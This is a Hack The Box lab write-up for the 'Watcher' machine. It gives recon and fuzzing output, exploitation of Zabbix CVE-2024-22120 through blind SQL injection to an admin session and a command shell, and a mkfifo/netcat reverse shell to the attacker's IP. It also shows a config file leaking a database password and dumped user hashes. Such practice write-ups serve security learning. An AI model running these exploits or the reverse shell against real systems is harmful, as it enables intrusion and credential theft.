---
title: Watcher
date: 2026-03-23
ShowToc: true
draft: false
TocOpen: true
tags:
  - blog
  - HTB
  - Linux
  - medium
  - CMS-zabbix-RCE
  - Linux-Privilege-Escalation-Zabbix-dateleak
  - Linux-Privilege-Escalation-teamcity
  - Nmap-Analyzing
  - Port43037-Java-Remote-Invocation-RMI-Pentest
  - Port53-DNS-redirct-web-link
  - BruteForce-subdomain-ffuf
  - BruteForce-Web-Directory-Feroxbuster
  - revshell-python-upgrade
  - Linux-Enumation-Apache-sentive-data
  - Port22-SSH-tunnel
  - CMS-Teamcity-Access-via-Database-Manipulation
lastmod: 2026-05-06T06:07:37.194Z
---
# Box Info

{{< htb-info "https://www.hackthebox.com/machines/watcher" >}}

***

# Recon

### PORT & IP SCAN

{{< toggle "Tag 🏷️" >}}

{{< tag "Nmap-Analyzing" >}} The target 10.129.234.163 is a Ubuntu Linux server exposing four ports: 22/tcp running OpenSSH 8.9p1, 80/tcp running Apache httpd 2.4.52 that redirects to http://watcher.vl/, 10050/tcp (tcpwrapped, most likely Zabbix agent), and 43047/tcp running a Java RMI service. The host appears to be the Watcher server within the baby2.vl domain, offering remote access via SSH, a web interface, monitoring capabilities, and a Java remote method invocation endpoint.

{{< /toggle >}}

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ cat serviceScan.txt 
# Nmap 7.98 scan initiated Mon Mar 23 22:07:27 2026 as: /usr/lib/nmap/nmap -sC -sV -p 22,80,10050,10051,43047 -T4 -oN serviceScan.txt 10.129.234.163
Nmap scan report for 10.129.234.163
Host is up (0.048s latency).

PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f0:e4:e7:ae:27:22:14:09:0c:fe:1a:aa:85:a8:c3:a5 (ECDSA)
|_  256 fd:a3:b9:36:17:39:25:1d:40:6d:5a:07:97:b3:42:13 (ED25519)
80/tcp    open  http       Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Did not follow redirect to http://watcher.vl/
|_http-server-header: Apache/2.4.52 (Ubuntu)
10050/tcp open  tcpwrapped
10050/tcp open  tcpwrapped
43047/tcp open  java-rmi   Java RMI
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Mar 23 22:07:47 2026 -- 1 IP address (1 host up) scanned in 20.22 seconds
                                                                                      
```

### Java RMI

{{< toggle "Tag 🏷️" >}}

{{< tag "Port43037-Java-Remote-Invocation-RMI-Pentest" >}} List Java RMI objects and methods to look for deserialization vulnerabilities or insecure methods that enable remote code execution.

{{< /toggle >}}

#### Background

Java Remote Method Invocation (RMI) is a Java API that enables objects running in one Java Virtual Machine (JVM) to invoke methods on objects in another JVM, often on a different physical system, facilitating distributed computing. It uses a client-server stub model, where stubs handle communication, and RMI Registry manages naming.

Ref : https://hacktricks.wiki/en/network-services-pentesting/1099-pentesting-java-rmi.html?highlight=RMI#rmi-**components**

Tool Preparation

```
$ sudo apt install maven -y
$ git clone https://github.com/qtc-de/remote-method-guesser
$ cd remote-method-guesser
$ mvn package
```

Initial Enumeration (Guess Mode)

```
──(parallels㉿kali-linux-2025-2)-[~/Desktop/remote-method-guesser]
└─$ java -jar target/rmg-5.1.0-jar-with-dependencies.jar guess 10.129.234.163 43047
```

Result Analysis

```
──(parallels㉿kali-linux-2025-2)-[~/Desktop/remote-method-guesser]
└─$ java -jar /home/parallels/Desktop/remote-method-guesser/target/rmg-5.1.0-jar-with-dependencies.jar guess 10.129.234.163 43047
[-] Caught NoSuchObjectException during RMI call.
[-] There seems to be no registry object available on the specified endpoint.
[-] Cannot continue from here.

```

* No RMI Registry is bound on the default naming service.
* This means no remote objects are currently listed or accessible via standard registry lookup.
* The RMI service is running, but it may be using a custom port setup, direct stub access, or the registry is not exposed.

### Watcher.vl

{{< toggle "Tag 🏷️" >}}

{{< tag "Port53-DNS-redirct-web-link" >}} While browser the direct link of http://10.129.234.163 which will redirect to http://watcher.vl/ , but need to add the domain name into the /etc/hosts for successfully previewing.

{{< /toggle >}}

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali-linux-2025-2.localdomain   kali-linux-2025-2
10.129.234.163  watcher.vl

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

After added , the website will be success loaded

![Pasted image 20260323230943.png](/ob/Pasted%20image%2020260323230943.png)

{{< tech-stack >}}

OS: Ubuntu Linux\
Web Server: Apache/2.4.52\
Language: PHP 8.1\
Database: MySQL 8.0\
Application: Zabbix

{{< /tech-stack >}}

{{< toggle "Tag 🏷️" >}}

{{< tag "BruteForce-subdomain-ffuf" >}} Given the use of some kind of host-based routing on the webserver, I’ll use `ffuf` to brute force for any subdomains of `watcher.vl` that respond differently than the default case:

{{< /toggle >}}

```
──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ ffuf -w ./subdomains-top1million-20000.txt:FUZZ  -u http://10.129.234.163 -H 'Host: FUZZ.watcher.vl' -ac 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.234.163
 :: Wordlist         : FUZZ: /home/parallels/Desktop/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.watcher.vl
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

zabbix                  [Status: 200, Size: 3946, Words: 199, Lines: 33, Duration: 328ms]
[WARN] Caught keyboard interrupt (Ctrl-C)

```

It finds one! I’ll add both to my `/etc/hosts` file:

```
10.129.234.163  watcher.vl zabbix.watcher.vl
```

{{< toggle "Tag 🏷️" >}}

{{< tag "BruteForce-Web-Directory-Feroxbuster" >}} The 404 page is just the default Apache 404 ,and the main page loads as index.html, suggesting a static site I’ll run feroxbuster against the site, and include `-x html` as the site uses static pages:

{{< /toggle >}}

```
──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$feroxbuster -u http://watcher.vl -x html
                                                                                                                      
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://watcher.vl
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 🔎  Extract Links         │ true
 💲  Extensions            │ [html]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      272c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      157l      389w     4991c http://watcher.vl/
200      GET      157l      389w     4991c http://watcher.vl/index.html
[####################] - 32s    30000/30000   0s      found:2       errors:0      
[####################] - 31s    30000/30000   957/s   http://watcher.vl/

```

Nothing .

### zabbix.watcher.vl

{{< toggle "Tag 🏷️" >}}

{{< tag "CMS-zabbix-RCE" >}} Allowing login as guest in cms zabbix ,and the CMS Server is Zabbix 7.0.0alpha1 ,exploited by CVE-2024-22120-RCE, give the sessionid to the python tool to get the admin to upload the shell.

{{< /toggle >}}

This has potential here. [The Zabbix ticket for this vuln](https://support.zabbix.com/browse/ZBX-24505) specifically calls out that it can lead to RCE, that 7.0.0alpha1 is vulnerable, and gives the steps to exploit.

![Pasted image 20260323231656.png](/ob/Pasted%20image%2020260323231656.png)

# Shell as Zabbix

I noted that there is the option for `sign in as guest`

![Pasted image 20260327132323.png](/ob/Pasted%20image%2020260327132323.png)

CMS Server is Zabbix 7.0.0alpha1

![Pasted image 20260327132445.png](/ob/Pasted%20image%2020260327132445.png)

The first step is to make sure I have access to at least one host. Under Monitoring –> Hosts there’s one entry:

I need to be able to run a command on it. Clicking pops a menu:

![Pasted image 20260327135251.png](/ob/Pasted%20image%2020260327135251.png)

“Ping” works (and shows it’s the same host running Zabbix):

![Pasted image 20260327140040.png](/ob/Pasted%20image%2020260327140040.png)

I need to get the “sessionid” from the `zbx_session` cookie. It’s just base64-encoded:

Extract any hostid available to this user (open Monitoring->Hosts, host id will be in response)

![Pasted image 20260327135952.png](/ob/Pasted%20image%2020260327135952.png)

```
uv add --script zabbix_server_time_based_blind_sqli.py pwntools
```

### burte-force the admin session

```
➜  watcher uv run  --script zabbix_server_time_based_blind_sqli.py  --ip 10.129.234.163 --hostid 10084 --sid e85607b598e315b362b7e06ce22126e6  | grep "(+)"  
(+) Extracting Zabbix config session key...
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_key=0
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_key=00
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_key=000
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) trying c=1[x] Opening connection to 10.129.234.163 on port 10051
(+) session_key=0001
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_key=00010
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) trying c=1[x] Opening connection to 10.129.234.163 on port 10051
(+) session_key=000101
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_key=0001010
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_key=00010100
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_key=000101000
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) trying c=1[x] Opening connection to 10.129.234.163 on port 10051
(+) session_key=0001010001
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_key=00010100010
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_key=000101000100
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) trying c=1[x] Opening connection to 10.129.234.163 on port 10051
(+) session_key=0001010001001
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_key=00010100010010
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_key=000101000100100
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_key=0001010001001000
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_key=00010100010010000
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) trying c=1[x] Opening connection to 10.129.234.163 on port 10051
(+) session_key=000101000100100001
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_key=0001010001001000010
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_key=00010100010010000100
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) trying c=1[x] Opening connection to 10.129.234.163 on port 10051
(+) session_key=000101000100100001001
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_key=0001010001001000010010
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_key=00010100010010000100100
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_key=000101000100100001001000
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_key=0001010001001000010010000
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_key=00010100010010000100100000
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_key=000101000100100001001000000
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_key=0001010001001000010010000000
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_key=00010100010010000100100000000
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_key=000101000100100001001000000000
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_key=0001010001001000010010000000000
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_key=00010100010010000100100000000000
(+) config session_key=00010100010010000100100000000000
(+) Extracting admin session_id...
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) trying c=1[x] Opening connection to 10.129.234.163 on port 10051
(+) session_id=1
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) trying c=1[x] Opening connection to 10.129.234.163 on port 10051
(+) session_id=11
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_id=110
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_id=1100
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_id=11000
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_id=110000
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) trying c=1[x] Opening connection to 10.129.234.163 on port 10051
(+) session_id=1100001
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_id=11000010
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_id=110000100
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_id=1100001000
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) trying c=1[x] Opening connection to 10.129.234.163 on port 10051
(+) session_id=11000010001
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_id=110000100010
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_id=1100001000100
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_id=11000010001000
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) trying c=1[x] Opening connection to 10.129.234.163 on port 10051
(+) session_id=110000100010001
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_id=1100001000100010
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_id=11000010001000100
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_id=110000100010001000
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_id=1100001000100010000
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_id=11000010001000100000
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_id=110000100010001000000
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_id=1100001000100010000000
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) trying c=1[x] Opening connection to 10.129.234.163 on port 10051
(+) session_id=11000010001000100000001
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_id=110000100010001000000010
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) trying c=1[x] Opening connection to 10.129.234.163 on port 10051
(+) session_id=1100001000100010000000101
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) trying c=1[x] Opening connection to 10.129.234.163 on port 10051
(+) session_id=11000010001000100000001011
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) trying c=1[x] Opening connection to 10.129.234.163 on port 10051
(+) session_id=110000100010001000000010111
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_id=1100001000100010000000101110
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_id=11000010001000100000001011100
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) trying c=1[x] Opening connection to 10.129.234.163 on port 10051
(+) session_id=110000100010001000000010111001
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) trying c=1[x] Opening connection to 10.129.234.163 on port 10051
(+) session_id=1100001000100010000000101110011
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_id=11000010001000100000001011100110
(+) admin session_id=11000010001000100000001011100110
(+) session_key=00010100010010000100100000000000, admin session_id=11000010001000100000001011100110. Now you can genereate admin zbx_cookie and sign it with session_key
➜  watcher 

```

### shell

```
➜  CVE-2024-22120-RCE git:(main) python CVE-2024-22120-RCE.py --ip zabbix.watcher.vl --sid e85607b598e315b362b7e06ce22126e6 --hostid 10084
(!) sessionid=e29cc8d946f1a3135fe7ceec60d0ff0d1a3135fe7ceec60d0ff0d
[zabbix_cmd]>>:  whoami 
zabbix

[zabbix_cmd]>>:  pwd
/

[zabbix_cmd]>>:  cd ..

[zabbix_cmd]>>:  ls
bin
boot
dev
etc
home
lib
lib32
lib64
libx32
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
swapfile
sys
tmp
user.txt
usr
var

[zabbix_cmd]>>:  cd home

[zabbix_cmd]>>:  ls
bin
boot
dev
etc
home
lib
lib32
lib64
libx32
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
swapfile
sys
tmp
user.txt
usr
var

[zabbix_cmd]>>:  cat user.txt
380b4ab4ba51812267f92b1a3dc131f3


```

# Shell as ROOT

{{< toggle "Tag 🏷️" >}}

{{< tag "Linux-Privilege-Escalation-Zabbix-dataleak" >}} Discovering the Zabbix 's /usr/share/zabbix/conf/zabbix.conf.php , will has the sensitive data , like the database password

{{< /toggle >}}

To get a real shell, I’ll give this script a bash reverse shell:

```
[zabbix_cmd]>>:  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.6 1234 >/tmp/f
```

This hangs, but at `nc`:

```
➜  CVE-2024-22120-RCE git:(main) ✗ sudo nc -lvnp 1234
listening on [any] 80 ...
connect to [10.10.16.6] from (UNKNOWN) [10.129.234.163] 57864
sh: 0: can't access tty; job control turned off
$ 
```

{{< toggle "Tag 🏷️" >}}

{{< tag "revshell-python-upgrade" >}} I’ll upgrade my shell using the python standard python upgrade .

{{< /toggle >}}

```
➜  CVE-2024-22120-RCE git:(main) ✗ sudo nc -lvnp 1234
listening on [any] 80 ...
connect to [10.10.16.6] from (UNKNOWN) [10.129.234.163] 42740
sh: 0: can't access tty; job control turned off

$ python3 -c 'import pty; pty.spawn("/bin/bash")'

zabbix@watcher:/$ ^Z

[1]  + 29702 suspended  sudo nc -lvnp 80
➜  CVE-2024-22120-RCE git:(main) ✗ stty raw -echo;fg
[1]  + 29702 continued  sudo nc -lvnp 80

export TERM=xterm
                                        
zabbix@watcher:/$ id
uid=115(zabbix) gid=122(zabbix) groups=122(zabbix)
zabbix@watcher:/$ 

```

That matches users with shells set in `passwd`:

```
zabbix@watcher:/home$ cat /etc/passwd | grep 'sh$'
root:x:0:0:root:/root:/bin/bash
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
zabbix@watcher:/home$ 
```

{{< toggle "Tag 🏷️" >}}

{{< tag "Linux-Enumation-Apache-sentive-data" >}} The Apache config shows three servers: These handle the rewrite to `watcher.vl`, and getting Zabbix to it’s site. The main site is in `/var/www/html`, and it’s just a single HTML page: found the sentive data of mysql database password

{{< /toggle >}}

```
zabbix@watcher:/etc/apache2/sites-available$ ls
ls
000-default.conf  default-ssl.conf  watcher.vl.conf  zabbix.watcher.vl.conf
zabbix@watcher:/etc/apache2/sites-available$ 
```

```
zabbix@watcher:/etc/apache2/sites-available$ cat zabbix.watcher.vl.conf
cat zabbix.watcher.vl.conf
# Define /zabbix alias, this is the default

<VirtualHost *:80>
    ServerAdmin webmaster@watcher.vl
    ServerName zabbix.watcher.vl

DocumentRoot /usr/share/zabbix

<Directory "/usr/share/zabbix">
    Options FollowSymLinks
    AllowOverride None
    Order allow,deny
    Allow from all

    <IfModule mod_php.c>
        php_value max_execution_time 300
        php_value memory_limit 128M
        php_value post_max_size 16M
        php_value upload_max_filesize 2M
        php_value max_input_time 300
        php_value max_input_vars 10000
        php_value always_populate_raw_post_data -1
    </IfModule>

    <IfModule mod_php7.c>
        php_value max_execution_time 300
        php_value memory_limit 128M
        php_value post_max_size 16M
        php_value upload_max_filesize 2M
        php_value max_input_time 300
        php_value max_input_vars 10000
        php_value always_populate_raw_post_data -1
    </IfModule>
</Directory>

<Directory "/usr/share/zabbix/conf">
    Order deny,allow
    Deny from all
    <files *.php>
        Order deny,allow
        Deny from all
    </files>
</Directory>

<Directory "/usr/share/zabbix/app">
    Order deny,allow
    Deny from all
    <files *.php>
        Order deny,allow
        Deny from all
    </files>
</Directory>

<Directory "/usr/share/zabbix/include">
    Order deny,allow
    Deny from all
    <files *.php>
        Order deny,allow
        Deny from all
    </files>
</Directory>

<Directory "/usr/share/zabbix/local">
    Order deny,allow
    Deny from all
    <files *.php>
        Order deny,allow
        Deny from all
    </files>
</Directory>

<Directory "/usr/share/zabbix/vendor">
    Order deny,allow
    Deny from all
    <files *.php>
        Order deny,allow
        Deny from all
    </files>
</Directory>
</VirtualHost>


```

/usr/share/zabbix

```
[zabbix_cmd]>>:  ls /usr/share/zabbix
api_jsonrpc.php
api_scim.php
app
assets
audio
browserwarning.php
chart.php
chart2.php
chart3.php
chart4.php
chart6.php
chart7.php
composer.json
composer.lock
conf
data
disc_prototypes.php
favicon.ico
graphs.php
history.php
host_discovery.php
host_prototypes.php
hostinventories.php
hostinventoriesoverview.php
httpconf.php
httpdetails.php
image.php
imgstore.php
include
index.php
index_http.php
index_sso.php
items.php
js
jsLoader.php
jsrpc.php
local
locale
map.php
modules
report2.php
report4.php
robots.txt
setup.php
sysmap.php
sysmaps.php
templates.php
tests
toptriggers.php
tr_events.php
trigger_prototypes.php
triggers.php
vendor
widgets
zabbix.php

```

which one is contain the sentive data ?

gemini , give the answer\
![Pasted image 20260328141108.png](/ob/Pasted%20image%2020260328141108.png)

I’ll find the Zabbix config in `/usr/share/zabbix/conf`:

```
[zabbix_cmd]>>:  cat /usr/share/zabbix/conf/zabbix.conf.php
<?php
// Zabbix GUI configuration file.

$DB['TYPE']                     = 'MYSQL';
$DB['SERVER']                   = 'localhost';
$DB['PORT']                     = '0';
$DB['DATABASE']                 = 'zabbix';
$DB['USER']                     = 'zabbix';
$DB['PASSWORD']                 = 'uIy@YyshSuyW%0_puSqA';

// Schema name. Used for PostgreSQL.
$DB['SCHEMA']                   = '';

// Used for TLS connection.
$DB['ENCRYPTION']               = false;
$DB['KEY_FILE']                 = '';
$DB['CERT_FILE']                = '';
$DB['CA_FILE']                  = '';
$DB['VERIFY_HOST']              = false;
$DB['CIPHER_LIST']              = '';

// Vault configuration. Used if database credentials are stored in Vault secrets manager.
$DB['VAULT']                    = '';
$DB['VAULT_URL']                = '';
$DB['VAULT_DB_PATH']            = '';
$DB['VAULT_TOKEN']              = '';
$DB['VAULT_CERT_FILE']          = '';
$DB['VAULT_KEY_FILE']           = '';
// Uncomment to bypass local caching of credentials.
// $DB['VAULT_CACHE']           = true;

// Uncomment and set to desired values to override Zabbix hostname/IP and port.
// $ZBX_SERVER                  = '';
// $ZBX_SERVER_PORT             = '';

$ZBX_SERVER_NAME                = 'Watcher';

$IMAGE_FORMAT_DEFAULT   = IMAGE_FORMAT_PNG;

// Uncomment this block only if you are using Elasticsearch.
// Elasticsearch url (can be string if same url is used for all types).
//$HISTORY['url'] = [
//      'uint' => 'http://localhost:9200',
//      'text' => 'http://localhost:9200'
//];
// Value types stored in Elasticsearch.
//$HISTORY['types'] = ['uint', 'text'];

// Used for SAML authentication.
// Uncomment to override the default paths to SP private key, SP and IdP X.509 certificates, and to set extra settings.
//$SSO['SP_KEY']                        = 'conf/certs/sp.key';
//$SSO['SP_CERT']                       = 'conf/certs/sp.crt';
//$SSO['IDP_CERT']              = 'conf/certs/idp.crt';
//$SSO['SETTINGS']              = [];


```

That has the DB connection info. I’ll connect:

```
zabbix@watcher:/usr/share/zabbix/conf$ mysql -h localhost -u zabbix -puIy@YyshSuyW%0_puSqA
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 3339
Server version: 8.0.43-0ubuntu0.22.04.2 (Ubuntu)

Copyright (c) 2000, 2025, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| performance_schema |
| zabbix             |
+--------------------+
3 rows in set (0.02 sec
```

There are a ton of tables in `zabbix`. I’ll get the users:

```
mysql> select * from users;
+--------+----------+--------+---------------+--------------------------------------------------------------+-----+-----------+------------+---------+---------+---------+----------------+------------+---------------+---------------+----------+--------+-----------------+----------------+
| userid | username | name   | surname       | passwd                                                       | url | autologin | autologout | lang    | refresh | theme   | attempt_failed | attempt_ip | attempt_clock | rows_per_page | timezone | roleid | userdirectoryid | ts_provisioned |
+--------+----------+--------+---------------+--------------------------------------------------------------+-----+-----------+------------+---------+---------+---------+----------------+------------+---------------+---------------+----------+--------+-----------------+----------------+
|      1 | Admin    | Zabbix | Administrator | $2y$10$E9fSsSLiu47a1gnTULjx9.YygFRbVotGx4BOIVRTLdEa5OGAxeX5i |     |         1 | 0          | default | 30s     | default |              0 |            |             0 |            50 | default  |      3 |            NULL |              0 |
|      2 | guest    |        |               | $2y$10$89otZrRNmde97rIyzclecuk6LwKAsHN0BcvoOKGjbT.BwMBfm7G06 |     |         0 | 15m        | default | 30s     | default |              0 |            |             0 |            50 | default  |      4 |            NULL |              0 |
|      3 | Frank    | Frank  |               | $2y$10$9WT5xXnxSfuFWHf5iJc.yeeHXbGkrU0S/M2LagY.8XRX7EZmh.kbS |     |         0 | 0          | default | 30s     | default |              0 |            |             0 |            50 | default  |      2 |            NULL |              0 |
+--------+----------+--------+---------------+--------------------------------------------------------------+-----+-----------+------------+---------+---------+---------+----------------+------------+---------------+---------------+----------+--------+-----------------+----------------+
3 rows in set (0.00 sec)
```

I can dump these hashes to `hashcat`, but they don’t crack with `rockyou.txt`.

{{< toggle "Tag 🏷️" >}}

{{< tag "Linux-Privilege-Escalation-teamcity" >}} Discovering the port 8111 in ss -tlap ,using the curl to know that is teamcity ,change zabbix's admin password in database to view the log for getting  the Frank 's password ,so i can RCE as the root.

{{< /toggle >}}

### ss -tlap

The `netstat` shows an interesting port:

```
[zabbix_cmd]>>:  ss -tlap 
State      Recv-Q Send-Q      Local Address:Port                 Peer Address:Port          Process                                                                                                                                                                                           
LISTEN     0      4096              0.0.0.0:zabbix-agent              0.0.0.0:*              users:(("zabbix_agentd",pid=704,fd=4),("zabbix_agentd",pid=703,fd=4),("zabbix_agentd",pid=701,fd=4),("zabbix_agentd",pid=700,fd=4),("zabbix_agentd",pid=699,fd=4),("zabbix_agentd",pid=686,fd=4))
LISTEN     0      4096              0.0.0.0:zabbix-trapper            0.0.0.0:*                                                                                                                                                                                                               
LISTEN     0      151             127.0.0.1:mysql                     0.0.0.0:*                                                                                                                                                                                                               
LISTEN     0      4096        127.0.0.53%lo:domain                    0.0.0.0:*                                                                                                                                                                                                               
LISTEN     0      128               0.0.0.0:ssh                       0.0.0.0:*                                                                                                                                                                                                               
LISTEN     0      511               0.0.0.0:http                      0.0.0.0:*                                                                                                                                                                                                               
LISTEN     0      70              127.0.0.1:33060                     0.0.0.0:*                                                                                                                                                                                                               
TIME-WAIT  0      0               127.0.0.1:zabbix-agent            127.0.0.1:54648                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:46422                   127.0.0.1:zabbix-agent                                                                                                                                                                                                    
TIME-WAIT  0      0               127.0.0.1:zabbix-agent            127.0.0.1:46400                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:zabbix-agent            127.0.0.1:38148                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:zabbix-agent            127.0.0.1:53526                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:zabbix-trapper          127.0.0.1:54928                                                                                                                                                                                                           
FIN-WAIT-2 0      0          10.129.234.163:http                   10.10.16.6:58526                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:zabbix-agent            127.0.0.1:54618                                                                                                                                                                                                           
FIN-WAIT-2 0      0          10.129.234.163:http                   10.10.16.6:58548                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:zabbix-trapper          127.0.0.1:53644                                                                                                                                                                                                           
TIME-WAIT  0      0          10.129.234.163:http                   10.10.16.6:59390                                                                                                                                                                                                           
ESTAB      0      0               127.0.0.1:zabbix-trapper          127.0.0.1:58676          users:(("ss",pid=18006,fd=18),("sh",pid=18005,fd=18))                                                                                                                                            
TIME-WAIT  0      0               127.0.0.1:zabbix-agent            127.0.0.1:46444                                                                                                                                                                                                           
LAST-ACK   0      1          10.129.234.163:http                   10.10.16.6:45974                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:zabbix-agent            127.0.0.1:38120                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:zabbix-agent            127.0.0.1:54626                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:zabbix-agent            127.0.0.1:35346                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:zabbix-trapper          127.0.0.1:45678                                                                                                                                                                                                           
